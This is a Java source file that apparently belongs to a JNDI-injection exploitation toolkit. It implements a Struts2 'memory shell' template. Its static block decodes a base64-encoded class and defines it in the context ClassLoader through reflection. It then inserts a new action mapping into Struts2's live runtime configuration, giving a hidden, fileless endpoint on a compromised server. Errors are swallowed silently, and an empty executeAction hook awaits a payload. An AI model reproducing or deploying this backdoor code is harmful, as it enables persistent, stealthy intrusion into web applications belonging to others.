package com.nu1r.jndi.template.struts2;

public class Struts2ActionMS {
    public static String pattern;

    public static String thisClass;

    static {
        try {
            if (thisClass != null) {
                ClassLoader loader = Thread.currentThread().getContextClassLoader();

                // 用 Context ClassLoader 加载，防止映射后再访问不到
                String selfName   = Struts2ActionMS.class.getName();
                byte[] classBytes = base64Decode(thisClass);

                Class                    loaderClass = Class.forName("java.lang.ClassLoader", false, loader);
                java.lang.reflect.Method defineClass = loaderClass.getDeclaredMethod("defineClass", String.class, byte[].class, Integer.TYPE, Integer.TYPE);
                defineClass.setAccessible(true);
                defineClass.invoke(loader, selfName, classBytes, Integer.valueOf("0"), classBytes.length);

                Class actionContextClass = Class.forName("com.opensymphony.xwork2.ActionContext", false, loader);

                pattern = pattern.substring(1);
                java.lang.reflect.Field filed = actionContextClass.getDeclaredField("actionContext");
                filed.setAccessible(true);
                ThreadLocal              context = (ThreadLocal) filed.get(null);
                Object                   con     = context.get();
                java.lang.reflect.Method method  = actionContextClass.getDeclaredMethod("getActionInvocation", null);
                method.setAccessible(true);
                Object        inv           = method.invoke(con);
                Object        invObj        = getFieldValue(inv, "proxy");
                Object        configuration = getFieldValue(invObj, "configuration");
                Object        runtimeConf   = getFieldValue(configuration, "runtimeConfiguration");
                Object        map           = getFieldValue(runtimeConf, "namespaceActionConfigs");
                java.util.Map m             = (java.util.Map) getFieldValue(map, "m");

                java.lang.reflect.Constructor<?> constructor = Class.forName("com.opensymphony.xwork2.config.entities.ActionConfig", false, loader).getDeclaredConstructor(new Class[]{String.class, String.class, String.class});
                constructor.setAccessible(true);
                Object                  actionConfig = constructor.newInstance("", pattern, selfName);

                // 这里常见的 context 是 "" 或者 "/"，在额外配置的时候可能需要额外处理
                java.util.LinkedHashMap o1           = (java.util.LinkedHashMap) m.get("");

                if (o1 == null) {
                    o1 = (java.util.LinkedHashMap) m.get("/");
                }

                o1.put(pattern, actionConfig);
            }
        } catch (Exception ignored) {
        }
    }

    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
        java.lang.reflect.Field f = null;
        if (obj instanceof java.lang.reflect.Field) {
            f = (java.lang.reflect.Field) obj;
        } else {
            Class cs = obj.getClass();
            while (cs != null) {
                try {
                    f = cs.getDeclaredField(fieldName);
                    cs = null;
                } catch (Exception e) {
                    cs = cs.getSuperclass();
                }
            }
        }
        f.setAccessible(true);
        return f.get(obj);
    }

    public String execute() throws Exception {
        Class                    actionContextClass = Class.forName("com.opensymphony.xwork2.ActionContext");
        java.lang.reflect.Method getContextMethod   = actionContextClass.getDeclaredMethod("getContext", null);
        getContextMethod.setAccessible(true);
        Object                   actionContext = getContextMethod.invoke(null);
        java.lang.reflect.Method get           = actionContextClass.getDeclaredMethod("get", String.class);
        get.setAccessible(true);
        Object                   req          = get.invoke(actionContext, "com.opensymphony.xwork2.dispatcher.HttpServletRequest");
        Class                    wrapperClass = Class.forName("javax.servlet.ServletRequestWrapper");
        java.lang.reflect.Method method       = wrapperClass.getDeclaredMethod("getRequest", null);
        method.setAccessible(true);
        Object realObj = method.invoke(req);
        Object resp    = get.invoke(actionContext, "com.opensymphony.xwork2.dispatcher.HttpServletResponse");
        executeAction(realObj, resp);
        return null;
    }

    public void executeAction(Object request, Object response) {
    }

    public static byte[] base64Decode(String bs) throws Exception {
        Class  base64;
        byte[] value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
            value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
            } catch (Exception e2) {
            }
        }
        return value;
    }
}
